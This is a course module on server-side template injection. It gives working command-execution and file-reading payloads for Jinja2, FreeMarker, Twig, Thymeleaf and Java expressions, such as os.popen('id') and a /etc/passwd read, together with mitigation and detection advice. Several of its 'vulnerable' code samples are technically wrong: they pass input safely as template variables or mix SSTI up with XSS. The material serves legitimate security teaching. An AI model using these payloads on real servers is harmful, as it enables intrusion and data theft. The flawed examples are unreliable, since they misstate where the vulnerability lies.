# SSTI (Server-Side Template Injection)

## What you will learn in this course üßêüßê

- Understand the concept of Server-Side Template Injection (SSTI)
- Learn how to exploit SSTI vulnerabilities

Developers use template engines on web servers to streamline web development by separating the presentation layer from business logic. This separation allows for clear management of design and layout independent of server-side functionality. Template engines promote reusability by enabling common page elements like headers and footers to be defined once and used across multiple pages, simplifying updates and ensuring consistency.

They also facilitate dynamic content generation, allowing pages to be rendered with real-time data based on user inputs or database content. This dynamic capability is essential for creating personalized web experiences. By centralizing design elements in templates, developers can efficiently update site-wide designs and maintain consistency across all pages.

### Exploitation

Attackers exploit SSTI vulnerabilities by injecting malicious template syntax (e.g., expressions or commands) into input fields processed by server-side template engines. This allows execution of arbitrary code within templates, leading to server compromise or unauthorized data access.Here is how a typical SSTI should work:

1. The attacker injects malicious template syntax into input fields processed by server-side templates.
2. This allows execution of arbitrary code within templates, leading to server compromise or data access.
3. The attacker gains control over server operations or accesses sensitive data.

![SSTI](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D05-Web_Pentesting_02/01-lectures/SSTI.png)

### Basic SSTI Techniques

#### Template Expression Injection

**Explanation**: This technique involves injecting template expressions directly into user inputs that are subsequently rendered by the server. If the server evaluates these expressions, it reveals the presence of a template engine capable of interpreting such syntax.

**Example Vulnerable Code**:

```python
# Example in a Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    user_input = request.args.get('name', '')
    return render_template_string('Hello {{ name }}!', name=user_input)
```

In this code, user input is directly injected into a template string. If an attacker inputs `{{7*7}}`, the application will evaluate it, potentially displaying `Hello 49!`.

**Exploitation Command**:

```http
GET /greet?name={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```

This request would render the response `Hello 49!` if the template engine evaluates the expression.

#### Payload Injection

**Explanation**: This technique involves injecting payloads crafted to exploit the template syntax, enabling arbitrary code execution or access to sensitive data.

**Example Vulnerable Code**:

```python
# Example in a Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/show')
def show():
    user_input = request.args.get('data', '')
    return render_template_string('{{ data }}', data=user_input)
```

Here, the user input is injected directly into the template without sanitization. An attacker could exploit this by injecting payloads designed to access server data.

**Exploitation Command**:

```http
GET /show?data={{config}} HTTP/1.1
Host: vulnerable-website.com
```

If the server evaluates the expression, it might expose configuration details, depending on what `config` refers to.

### Identifying the Template Engine

#### Error-Based Detection

**Explanation**: Use payloads that cause errors to determine the template engine based on the format of the error messages produced.

**Example Vulnerable Code**:

```html
<!-- Example in a Java web application -->
<html>
<body>
    <h1>${userInput}</h1>
</body>
</html>
```

In this JSP code, injecting `${7/0}` will cause an arithmetic error, which can help identify the template engine.

**Exploitation Command**:

```http
GET /show?userInput=${7/0} HTTP/1.1
Host: vulnerable-website.com
```

The error message returned can provide clues about the template engine based on its format.

#### Mathematical Operations

**Explanation**: Inject simple mathematical expressions to see if the server evaluates them, which can help in identifying the template engine.

**Example Vulnerable Code**:

```html
<!-- Example in a JSP application -->
<html>
<body>
    <h1>${userInput}</h1>
</body>
</html>
```

Injecting `${7*7}` will compute the expression if the template engine evaluates it.

**Exploitation Command**:

```http
GET /show?userInput=${7*7} HTTP/1.1
Host: vulnerable-website.com
```

If the server evaluates the expression, the response will show `49`, indicating that the template engine processes mathematical operations.

### Exploiting Specific Template Engines

#### Java

**Explanation**: In Java applications, expressions like `${T(java.lang.Runtime).getRuntime().exec('id')}` can be used to execute system commands, exploiting Java‚Äôs template capabilities.

**Example Vulnerable Code**:

```java
// Vulnerable JSP code
<%= request.getParameter("input") %>
```

This JSP code directly renders user input, making it vulnerable to SSTI.

**Exploitation Command**:

```http
GET /show?input=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: vulnerable-website.com
```

This command executes the `id` command on the server, potentially revealing user information.

#### FreeMarker

**Explanation**: FreeMarker templates can be exploited using payloads like `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}` to run system commands.

**Example Vulnerable Code**:

```java
// Vulnerable FreeMarker template
<#-- FreeMarker template -->
${userInput}
```

This FreeMarker template renders user input directly.

**Exploitation Command**:

```http
GET /show?userInput=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")} HTTP/1.1
Host: vulnerable-website.com
```

This command executes the `id` command on the server, potentially revealing system information.

#### Thymeleaf

**Explanation**: Thymeleaf expressions like `${T(java.lang.Runtime).getRuntime().exec('calc')}` can be used to execute commands on the server.

**Example Vulnerable Code**:

```html
<!-- Vulnerable Thymeleaf template -->
<p th:text="${userInput}"></p>
```

This Thymeleaf template renders user input, making it susceptible to SSTI.

**Exploitation Command**:

```http
GET /show?userInput=${T(java.lang.Runtime).getRuntime().exec('calc')} HTTP/1.1
Host: vulnerable-website.com
```

This command executes the `calc` application on the server.

#### Twig (PHP)

**Explanation**: Twig templates in PHP can be exploited using payloads like `{{['id']|filter('system')}}` to run system commands.

**Example Vulnerable Code**:

```php
// Vulnerable Twig template
{{ user_input }}
```

This Twig template directly renders user input.

**Exploitation Command**:

```http
GET /show?user_input={{['id']|filter('system')}} HTTP/1.1
Host: vulnerable-website.com
```

This command executes the `id` command on the server.

#### Jinja2 (Python)

**Explanation**: Jinja2 templates can be exploited with expressions like `{{ cycler.__init__.__globals__.os.popen('id').read() }}` to run commands.

**Example Vulnerable Code**:

```python
# Vulnerable Jinja2 template rendering
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/show')
def show():
    user_input = request.args.get('input', '')
    return render_template_string('{{ input }}', input=user_input)
```

This Flask application renders user input in a Jinja2 template.

**Exploitation Command**:

```http
GET /show?input={{ cycler.__init__.__globals__.os.popen('id').read() }} HTTP/1.1
Host: vulnerable-website.com
```

This command executes the `id` command on the server, exposing user information.

### Advanced Techniques

#### Sandbox Bypass

**Explanation**: Some template engines use sandboxing to limit what expressions can do. However, weaknesses in these sandboxes can sometimes be exploited to execute arbitrary code. This often involves complex techniques or leveraging less common features to bypass restrictions.

**Example Vulnerable Code**:

```python
# Vulnerable Jinja2 sandboxed template
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/show')
def show():
    user_input = request.args.get('input', '')
    return render_template_string('{{ input }}', input=user_input)
```

This code might be sandboxed but could still be vulnerable to sophisticated bypass techniques.

**Exploitation Command**:

```http
GET /show?input={{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }} HTTP/1.1
Host: vulnerable-website.com
```

This command attempts to read sensitive files by bypassing sandbox restrictions.

#### Combining SSTI with Other Vulnerabilities

**Explanation**: Combining SSTI with other vulnerabilities such as XSS or CSRF can amplify the impact of the attack. For example, exploiting SSTI to inject scripts that also leverage XSS can execute scripts in the victim's browser or perform actions on their behalf.

**Example Vulnerable Code**:

```html
<!-- Vulnerable HTML with potential XSS -->
<div>{{ user_input }}</div>
```

This code renders user input directly, making it susceptible to both SSTI and XSS.

**Exploitation Command**:

```http
GET /show?user_input=<script>alert('XSS')</script> HTTP/1.1
Host: vulnerable-website.com
```

This command injects a script that will execute in the context of the victim‚Äôs browser, demonstrating an XSS vulnerability combined with SSTI.

## Mitigation Techniques

To effectively prevent SSTI (Server-Side Template Injection) vulnerabilities, it's essential to incorporate secure coding practices and proper template engine configurations. A fundamental strategy is to ensure that user inputs are not directly rendered in templates without rigorous sanitization. One effective approach is to escape user inputs to treat them as plain text, rather than executable code.

Here‚Äôs an example of how you can safely handle user inputs in a Flask application to prevent SSTI vulnerabilities:

```python
from flask import Flask, request, escape, render_template_string

app = Flask(__name__)

@app.route('/show')
def show():
    # Retrieve user input
    user_input = request.args.get('input', '')
    # Escape user input to prevent interpretation as template syntax
    escaped_input = escape(user_input)
    # Render escaped user input in the template
    return render_template_string('{{ input }}', input=escaped_input)
```

In this example, the `escape` function from Flask's `escape` module is used to convert special characters in user input into HTML entities, thus preventing any template syntax or malicious payload from being executed. The `render_template_string` function then renders the escaped input safely within the template.

Additionally, it‚Äôs crucial to select a template engine with built-in security features. Ensure that the engine automatically escapes content and restricts functionalities that are not necessary for your application. Properly configure these engines to disable any features that could be exploited, and avoid exposing detailed error messages or stack traces to users, as these can provide valuable information for attackers.

Another important practice is to run your application with the minimum required privileges. This approach limits the damage that can be done even if an SSTI vulnerability is exploited. Regular security audits and code reviews are also vital to maintaining a secure application. By identifying and addressing potential vulnerabilities early, you can ensure that your code adheres to security best practices.

## Detection Techniques

Detecting SSTI vulnerabilities requires a proactive approach, involving both testing and monitoring. Security testing should be integrated into the development process, using tools designed to detect SSTI by injecting common payloads into input fields and observing the application's behavior. In addition to automated testing, manual code reviews should focus on areas where user input is passed to template engines, identifying potential vulnerabilities before they can be exploited.

Monitoring and logging play a crucial role in detecting SSTI attempts. Detailed logging of all user inputs, particularly those that trigger template rendering, allows for the identification of unusual activities such as template rendering errors or unexpected data processing. By analyzing these logs, security teams can detect potential SSTI exploitation attempts early.

Runtime protection mechanisms, such as runtime application self-protection (RASP) tools, offer real-time monitoring and can prevent the execution of untrusted template code. These tools add an additional layer of security by detecting and blocking malicious activities during the execution of template rendering.

Integrating automated security scanning tools into the CI/CD pipeline is another effective detection strategy. These tools can continuously check for SSTI vulnerabilities and misconfigurations related to template engines, ensuring that potential issues are identified and addressed early in the development cycle. Regular penetration testing further enhances detection efforts by simulating real-world attacks, identifying complex SSTI vulnerabilities that automated tools might miss, and providing a comprehensive security assessment.

## Resources

- [Jinja2 SSTI](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md)
- [What is SSTI?](https://workbook.securityboat.net/Pentesting/Web%20Application/server-side-template-injection-ssti/)
